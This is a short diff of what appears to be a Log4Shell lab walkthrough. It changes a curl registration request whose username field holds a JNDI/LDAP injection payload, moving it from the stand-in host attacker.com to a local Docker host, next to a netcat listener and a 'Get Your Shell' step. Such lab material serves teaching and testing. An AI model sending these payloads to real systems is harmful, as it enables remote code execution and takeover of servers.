@@ -52,7 +52,7 @@ nc -lvnp 4444
 ```bash
 curl -X POST http://localhost:8080/register \
   -H "Content-Type: application/json" \
-  -d '{"username":"${jndi:ldap://attacker.com/Exploit}","email":"notanemail","password":"test123"}'
+  -d '{"username":"${jndi:ldap://host.docker.internal:1389/Exploit}","email":"notanemail","password":"test123"}'
 ```
 
 ### Step 5: Get Your Shell
